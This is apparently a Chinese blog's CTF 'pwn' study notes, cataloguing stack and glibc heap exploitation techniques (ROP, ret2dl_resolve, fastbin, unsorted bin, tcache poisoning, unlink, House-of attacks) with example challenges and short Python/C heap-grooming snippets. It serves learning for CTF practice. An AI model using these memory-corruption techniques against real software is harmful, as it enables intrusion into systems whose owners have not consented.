<h1 id="绑定libc"><a href="#绑定libc" class="headerlink" title="绑定libc"></a>绑定libc</h1><p>p=process([‘./bin’],env={‘LOAD_PRELOAD’:’./libc-2.23.so’})</p>
<h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><strong>Defcon 2015 Qualifier R0pbaby，AliCTF 2016 vss，PlaidCTF 2013 ropasaurusrex</strong></p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>找后门位置</p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>shellcode的编写，以及一些编码的方法，如可见字符的shellcode等</p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>参数的设置</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>leak出libc，以及确定libc的版本</p>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>__libc_csu_init中的gadgets</p>
<h3 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h3><p>找call reg或者jmp reg</p>
<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>Defcon 2015 Qualifier fuckup</p>
<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p><a href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er" target="_blank" rel="noopener">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er</a></p>
<p><strong>HCTF 2016 出题人跑路了(pwn50)</strong></p>
<h2 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h2><p><strong>EKOPARTY CTF 2016 fuckzing-exploit-200(基于栈的stack pivot)</strong><br><strong>HACKIM CTF 2015 -Exploitation 5(基于堆的stack pivot)</strong></p>
<h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>了解动态链接的过程：<br>《程序员的自我修养》<br><a href="http://blog.chinaunix.net/uid-2477416-id-3053007.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-2477416-id-3053007.html</a></p>
<p>伪造动态链接的相关数据结构如linkmap、relplt：<br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><strong>Codegate CTF Finals 2015 yocto(fake relplt) <a href="http://o0xmuhe.me/2016/10/25/yocto-writeup" target="_blank" rel="noopener">http://o0xmuhe.me/2016/10/25/yocto-writeup</a></strong><br><strong>HITCON QUALS CTF 2015 readable(fake linkmap)</strong></p>
<p><strong>Hack.lu’s 2015 OREO</strong></p>
<h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><p>覆盖canary保护输出的字符地址</p>
<h2 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h2><p><a href="http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/" target="_blank" rel="noopener">http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/</a><br>HCTF 2016 fheap(基于堆溢出的Partial overwrite)<br>溢出位数不够：<br><strong>XMAN 2016 广外女生-pwn</strong><br><strong>Codegate CTF Finals 2015,chess</strong></p>
<h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><h2 id="堆管理机制"><a href="#堆管理机制" class="headerlink" title="堆管理机制"></a>堆管理机制</h2><p>多数Linux发行版：ptmalloc/dlmalloc glibc内存管理ptmalloc源代码分析.pdf（精读1-27，粗读28-130）<br>Android/firfox:jemalloc<br>windows:微软自己实现了一套内存管理机制<br>Linux内核：slab、slub、slob分配器</p>
<h2 id="堆漏洞的利用思想"><a href="#堆漏洞的利用思想" class="headerlink" title="堆漏洞的利用思想"></a>堆漏洞的利用思想</h2><p>破坏堆内存管理的相关数据结构：如arena、bin、chunk<br>破坏堆内存中的用户数据：覆盖变量指针、函数指针、数据等<br>一般情况下都是为了构造任意内存读写以及控制流劫持</p>
<h2 id="堆漏洞的防护方法"><a href="#堆漏洞的防护方法" class="headerlink" title="堆漏洞的防护方法"></a>堆漏洞的防护方法</h2><p>保护堆内存管理相关的数据结构：Heap Canary、对数据结构进行加密、在堆管理代码中加入大量安全检查<br>通用防护：ASLR、DEP</p>
<h2 id="堆漏洞利用技术与技巧"><a href="#堆漏洞利用技术与技巧" class="headerlink" title="堆漏洞利用技术与技巧"></a>堆漏洞利用技术与技巧</h2><h3 id="Use-After-Free-amp-Double-Free"><a href="#Use-After-Free-amp-Double-Free" class="headerlink" title="Use After Free &amp; Double Free"></a>Use After Free &amp; Double Free</h3><p>UAF:<strong>DEFCON CTF Qualifier 2014:shitsco、BCTF 2016:router、HCTF 2016 5-days(较难)</strong></p>
<p>Double Free: <strong>0CTF 2016:freenote、HCTF 2016 fheap、HCTF 2016 5-days(较难)</strong></p>
<h3 id="Heap-Overwrite"><a href="#Heap-Overwrite" class="headerlink" title="Heap Overwrite"></a>Heap Overwrite</h3><h4 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h4><p><strong>XMAN 2016 fengshui(紫荆花 pwn)，SSC安全大会百度展厅 heapcanary，攻防世界 babyfengshui</strong></p>
<h4 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h4><p>利用套路:Heap fengshui，house of Spirit</p>
<p><strong>alictf 2016 fb，alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p>
<p><strong>alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p>
<p><strong>0ctf 2016 zerostorage(较难)</strong></p>
<h4 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h4><p>利用思路</p>
<p>​    victm-&gt;bk为要写入地址-4，再次分配时bck-&gt;fd=unsorted_chunks(av)会触发一个任意地址写。写入内容是libc中的一个地址。只不过此时unsortbin被破坏，再次分配代码会崩掉，通常可以改写global_max_fast，从而导致接下来所有分配都是在fastbin进行</p>
<p>​    通过堆溢出覆盖victim-&gt;bk为一个size为fake chunk，再次分配unsorted_chunks(av)-&gt;bk=bck会改写unsortbin链表头的bk，此时再分配x-4大小的内存即可返回fakechunk。</p>
<p><strong>0ctf2016 Zerostorage</strong></p>
<h4 id="Overwrite-Topchunk"><a href="#Overwrite-Topchunk" class="headerlink" title="Overwrite Topchunk"></a>Overwrite Topchunk</h4><p>House of Force:</p>
<p>​    Bin中没有任何合适的内存时会从Topchunk分配内存</p>
<p>​    改写Topchunk的size为一个很大的数，如0xffffffff，分配alloc_size-4大小的内存，由于alloc_size可控，所以此时topchunk位置可控，再次分配即可分配到想分配的位置</p>
<p>​    需要预先泄漏topchunk地址</p>
<p><strong>BCTF 2016 bcloud，BCT 2016 ruin(arm结构的程序)</strong></p>
<h4 id="Classical-amp-Modern-Unlink-Attack"><a href="#Classical-amp-Modern-Unlink-Attack" class="headerlink" title="Classical&amp;Modern Unlink Attack"></a>Classical&amp;Modern Unlink Attack</h4><p>Unlink:当free(mem)调用时，如果与mem相邻的块是空闲的，则会将其从空闲链表中拿(unlink)下来并与mem合并</p>
<p>classical Unlink Attack(现glibc中有检查，不可用)：</p>
<p>​    如果通过heapoverflow将P-&gt;bk以及P-&gt;fd覆盖位攻击者可控制的地址，那FD-&gt;bk=BK;BK-fd=FD;=&gt;P-&gt;fd-&gt;bk=P-&gt;bk;P-&gt;bk-&gt;fd=p-&gt;fd;造成任意写，不过要求(要写的内容+4)or(要写的内容+8)必须可写，否则会崩溃。</p>
<p>Modern Unlink Attack:</p>
<p>​    找一个Pointer X，*X=P，Overflow P-bk=X-4;P-fd=X-8</p>
<p>​    P-&gt;bk-&gt;fd==X-4-&gt;fd==P，P-&gt;fd-&gt;bk==X-8-&gt;bk=P</p>
<p>​    Unlink可得到*p=X，此时可通过P修改X，如果X是数据指针则可能造成任意地址读写</p>
<p><strong>Hitcon 2014 qualifier stkof，MMA CTF 2016 Dairy，PlaidCTF 2014 200 ezhp</strong></p>
<h4 id="Off-by-one-amp-Off-by-null"><a href="#Off-by-one-amp-Off-by-null" class="headerlink" title="Off by one &amp; Off by null"></a>Off by one &amp; Off by null</h4><p>Glibc_Adventures-The_Forgotten_Chunks.pdf</p>
<p><strong>off by one:MMA CTF 2016 Dairy</strong></p>
<p><strong>off by null:plaid CTF 2015 datastore，XMAN 2016 Final love_letter</strong></p>
<h4 id="Other-techniques"><a href="#Other-techniques" class="headerlink" title="Other techniques"></a>Other techniques</h4><p>改写morecore:<strong>HCTF 2016 5-days</strong></p>
<p>House of Orange : 改写_IO_list_all : <strong>Hitcon 2016House of orange</strong></p>
<h3 id="General-exploit-techniques"><a href="#General-exploit-techniques" class="headerlink" title="General exploit techniques"></a>General exploit techniques</h3><h4 id="Heap-fengshui-堆风水-堆排布"><a href="#Heap-fengshui-堆风水-堆排布" class="headerlink" title="Heap fengshui(堆风水/堆排布)"></a>Heap fengshui(堆风水/堆排布)</h4><p>通过操纵内存的分配与释放，来控制堆快装内存中的相对位置</p>
<p>动机：真实漏洞在利用的时候，堆是混乱的，因为存在漏洞的服务可能已经服务过很多用户，在触发漏洞时无法预计堆已经做了多少次malloc多少次free</p>
<p>Heap fengshui可以让堆从混乱状态转换为确定状态</p>
<p>不同的内存管理策略对应的heap fengshui的方法不同</p>
<p><strong>XMAN 2016 fengshui，33c3 CTF babyfengshui</strong></p>
<h4 id="Heap-spray-对喷"><a href="#Heap-spray-对喷" class="headerlink" title="Heap spray(对喷)"></a>Heap spray(对喷)</h4><p>不断分配分配内存，并填充(大量0x0c)+shellcode，直到0x0c0c0c0c内存地址被分配，多用于脚本语言漏洞的利用</p>
<p>大多数内存地址的值都是0x0c0c0c0c，0x0c0c0c0c地址也是0x0c slide+shellcode可以用其绕过ASLR，控制流劫持(jmpaddr/jmp <em>addr)时，只要addr是喷过地址都可以执行shellcode，注意</em><code>addr=0x0c0c0c0c **addr=0x0c0c0c0c  ***addr=0x0c0c0c0c</code></p>
<p>必须在NX关闭时才能直接用heap spray劫持控制流</p>
<p><strong>pwnhub.cn calc</strong></p>
<h4 id="Exploit-mmap-chunk"><a href="#Exploit-mmap-chunk" class="headerlink" title="Exploit mmap chunk"></a>Exploit mmap chunk</h4><p>当malloc内存块大于128k时，glibc会直接mmap内存</p>
<p>如果mmap的内存将整个binary的地址空间全部覆盖，我们可以轻松拿到任意地址相邻的堆内存，ASLR就失去意义</p>
<p>适用于没有限制分配内存大小的题目</p>
<p><strong>Hitcon 2014 qualifier stkof</strong></p>
<p>0ops培训资料Linux heap internal.pdf</p>
<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p><strong>MMACTF 2016 greeting，HCTF 2016 fheap，RuCTF 2016 weather</strong></p>
<h1 id="竞争条件漏洞"><a href="#竞争条件漏洞" class="headerlink" title="竞争条件漏洞"></a>竞争条件漏洞</h1><p><strong>安恒杯 武汉大学邀请赛 fackfuzz，stupid shell</strong></p>
<p><strong>stupid shell</strong></p>
<h1 id="代码逻辑漏洞"><a href="#代码逻辑漏洞" class="headerlink" title="代码逻辑漏洞"></a>代码逻辑漏洞</h1><p><strong>UCTF 2016 note</strong></p>
<h1 id="类型混淆漏洞"><a href="#类型混淆漏洞" class="headerlink" title="类型混淆漏洞"></a>类型混淆漏洞</h1><p><strong>CVE-2015-3077</strong></p>
<h1 id="缓冲区未初始化"><a href="#缓冲区未初始化" class="headerlink" title="缓冲区未初始化"></a>缓冲区未初始化</h1><p>栈未初始化时，栈中数据为上次函数调用留下的栈帧</p>
<p>堆未初始化时，堆中数据为上次使用该堆块所留下的数据</p>
<p><strong>UCTF 2016 note，华山杯2016决赛 SU_PWN，33C3 CTF PWN</strong></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn中各种利用技巧2</title>
    <url>/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A72/</url>
    <content><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>把ret指针修改为jmp esp的地址，其后加上asm(sub esp,20,;jmp esp)，来跳转到shellcode处（ps：20表示偏移量20，需修改）</p>
<h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>利用leave劫持ebp，从而使得ret到ebp+8</p>
<h1 id="基于堆类型"><a href="#基于堆类型" class="headerlink" title="基于堆类型"></a>基于堆类型</h1><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>FIFO：先进先出</p>
<p>free后，fd和bk为main_arena加上一定偏移的地址，可用于泄漏libc地址。</p>
<h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>FILO：先进后出</p>
<p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p>
<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p>FILO：先进后出</p>
<p>free时每类大小的bin中可存放7个tcache，其fd指向下一个tcache。</p>
<p>malloc时如果从fastbin中申请一个块，则剩下的块存入tcache中至满。</p>
<p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p>
<h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p>为双向链表，构造时需要同时修改fd与bk</p>
<h1 id="基于堆的攻击方法"><a href="#基于堆的攻击方法" class="headerlink" title="基于堆的攻击方法"></a>基于堆的攻击方法</h1><h2 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h2><p>直接溢出，最容易利用，需要构造好块</p>
<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>free后未把指针置NULL，可重复使用该指针</p>
<h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>通常与UAF一起出现</p>
<p>常见套路:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这时申请到的块依次为1-&gt;2-&gt;1，fastbin可通过此任意申请地址</p>
<h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>原理：修改fd指针伪造fastbin链。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(ptr))<span class="comment">#UAF</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>

<p>此时3的地址为ptr+0x10，注意，ptr+8处的值应对应申请的fastbin大小。</p>
<h2 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h2><p>2.23版本位于0x3c67f8处</p>
<p>修改后可将fastbin范围扩大，更容易使用fastbin相关攻击。</p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin dup consolidate"></a>fastbin dup consolidate</h2><p>通过申请largebin触发malloc_consolidate，即可将原本free的fastbin放入unsortbin中，然后再次free。</p>
<p>利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>此时fastbin和unsortbin中都有0对应的地址。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>与fastbin类似，但需要bk。（双向链表）</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>free后控制bk指针填入一个地址，再申请同样大小的块，即可向(指定地址+2*size)处填入类似[main_arena+88]的地址。</p>
<p>利用套路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptr &#x3D; 0x602180</span><br><span class="line">new(0,0x400)</span><br><span class="line">new(9,10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x10,p64(0)+p64(ptr-0*10))</span><br><span class="line">new(1,0x400)</span><br></pre></td></tr></table></figure>

<p>此时0处地址为[main_arena+88]的地址。</p>
<p>注：堆的申请应该在unsortbin之前完成，否则会报错</p>
<h2 id="unsorted-bin-into-stac"><a href="#unsorted-bin-into-stac" class="headerlink" title="unsorted bin into stac"></a>unsorted bin into stac</h2><p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line">  stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">  stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line">  victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时victim1的地址与stack_buffer相同</p>
<h2 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h2><p>利用条件：off by one或off by null</p>
<h3 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h3><p>通过把p位置置0来伪造前面块为freed状态，并且prev_size为前面的伪造free的大小，从而重复申请得到两个指向同一地址的指针</p>
<p>常见利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0xf8</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>

<p>此时4的地址与1相同</p>
<h3 id="chunk-shrink"><a href="#chunk-shrink" class="headerlink" title="chunk shrink"></a>chunk shrink</h3><p>原理：申请时分割用了size位，free时向前合并时只检查了prev_size</p>
<p>利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x218</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x200</span>,<span class="string">'\x00'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x218</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x219</span>,<span class="string">'\x00'</span>*<span class="number">0x218</span>+<span class="string">'\x00'</span>)<span class="comment">#将2的size位设为0x200，避免覆盖到3的prev_size位</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x80</span>)<span class="comment">#获取一个指针留用</span></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#将2放入unsortbin中</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>free(3)后2变为top chunk，通过构造后可以再申请回4处的地址</p>
<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="new（small-bin-unlink）"><a href="#new（small-bin-unlink）" class="headerlink" title="new（small bin unlink）"></a>new（small bin unlink）</h3><p>在free中若p位为0，则会进行合并，并且将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
<p>利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span>+<span class="number">0x8</span><span class="comment">#ptr为指向伪造的堆块的地址</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)<span class="comment">#伪造堆</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>此时ptr处的地址会被更改为ptr-0x18相应地址的值(即伪造堆的fd)</p>
<h3 id="old"><a href="#old" class="headerlink" title="old"></a>old</h3><p>旧版的libc（picoctf2019有出现，但就是不知道怎么编译的），一般是32位的程序</p>
<p>将当前堆的prev_size和size位置为0xfffffffc，则会认为上一块的位置为p-(-0x4)。（size位可随意填写）</p>
<p>设fd覆盖为p，bk覆盖为q。</p>
<p>则free相邻的前一个块后，*(q+8)=p， *(p+0xc)=q。</p>
<p>（好像还有其他的利用方法。。。不是很懂，没有具体的程序可以分析，不过picoctf那道倒是这么做的）</p>
<h2 id="Tcache-1"><a href="#Tcache-1" class="headerlink" title="Tcache"></a>Tcache</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>覆盖 tcache entry 结构体中的 next 域，不经过任何伪造（不需要检查size位） chunk 即可分配到另外地址,类似于fastbin attack。</p>
<p>利用方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">9</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(ptr))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x400</span>)</span><br></pre></td></tr></table></figure>

<p>此时4的地址为ptr。</p>
<h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>类似于 fastbin 的double free，就是多次释放同一个tcache，形成环状链表</p>
<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>控制<code>tcache_perthread_struct</code>结构体</p>
<p>修改其中相应大小bins的数量及地址，即可任意申请</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>free 内存后，使得栈上的一块地址进入 tcache 链表，这样再次分配的时候就能把这块地址分配出来</p>
<h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p>
<h2 id="house-of-系列"><a href="#house-of-系列" class="headerlink" title="house of 系列"></a>house of 系列</h2><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><ol>
<li>伪造堆块</li>
<li>覆盖堆指针指向上面伪造堆</li>
<li>释放堆块</li>
<li>申请堆块</li>
</ol>
<p>例题：l-ctf2016–pwn200</p>
<h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><h4 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h4><ol>
<li>申请a、b块</li>
<li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li>
<li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li>
<li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址</li>
<li>释放掉堆块b，此时再申请即从伪造堆处开始</li>
</ol>
<h4 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h4><ol>
<li>申请a、b块</li>
<li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li>
<li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li>
<li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址，并且将相邻的下一堆块的prev_size设置为同样的b-&gt;fd的地址减去伪造堆的地址</li>
<li>释放掉堆块b，此时再申请即从伪造堆处开始</li>
</ol>
<h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><p>利用条件：</p>
<ol>
<li>能够控制top chunk的size位</li>
<li>能自用控制malloc的分配大小</li>
<li>分配的次数不能受限制</li>
</ol>
<p>利用方法：</p>
<ol>
<li>申请堆块a</li>
<li>将topchunk的size改为-1</li>
<li>申请(addr-0x28)-topchunk_addr的块</li>
<li>再申请块，即可获得指向addr的块</li>
</ol>
<h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><ol>
<li>申请堆块a,b</li>
<li>伪造堆块f1，f2：其中f1的prev_size和size位为0，fd指向堆块a，bk指向堆块f2；f2的fd指向f1</li>
<li>释放堆块a</li>
<li>申请堆块c</li>
<li>设置堆块a的bk为f1的地址</li>
<li>申请堆块d、e，则堆块e指向f1</li>
</ol>
<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p>通过修改chunk1的size位实现overlap。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line">chunk[<span class="number">-1</span>]=<span class="number">0xa1</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure>

<p>此时chunk1对应bin的大小为0xa0；chunk2对应bin的大小为0x50，再申请对应大小堆块即可overlap。</p>
